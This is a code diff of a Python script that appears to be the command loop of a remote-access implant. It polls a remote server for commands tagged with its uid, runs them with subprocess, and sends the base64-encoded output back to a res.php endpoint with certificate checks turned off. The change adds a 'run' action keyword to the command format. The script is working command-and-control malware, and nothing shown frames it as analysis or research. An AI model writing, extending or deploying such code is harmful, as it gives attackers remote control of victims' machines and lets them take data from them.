@@ -19,14 +19,16 @@ while True:
 	cmds = str(cmds.text)
 	for lines in cmds.splitlines():
 		if str(uid) in lines:
-			cmd = str(lines.split(":",1)[1])
-			cmdlist = cmd.split(" ")
-			res = subprocess.check_output(cmdlist)
-			res = res.decode("utf-8")
-			res_bytes = res.encode('ascii')
-			resbase64_bytes = base64.b64encode(res_bytes)
-			resbase64 = resbase64_bytes.decode('ascii')
-			gimme = requests.get(url + "/res.php?res=" + resbase64 + "&id="+uid, verify=False)
+			act=str(lines.split(":",2)[1])
+			if act == "run":
+				cmd = str(lines.split(":",2)[2])
+				cmdlist = cmd.split(" ")
+				res = subprocess.check_output(cmdlist)
+				res = res.decode("utf-8")
+				res_bytes = res.encode('ascii')
+				resbase64_bytes = base64.b64encode(res_bytes)
+				resbase64 = resbase64_bytes.decode('ascii')
+				gimme = requests.get(url + "/res.php?res=" + resbase64 + "&id="+uid, verify=False)
 	
 	
 	time.sleep(10)
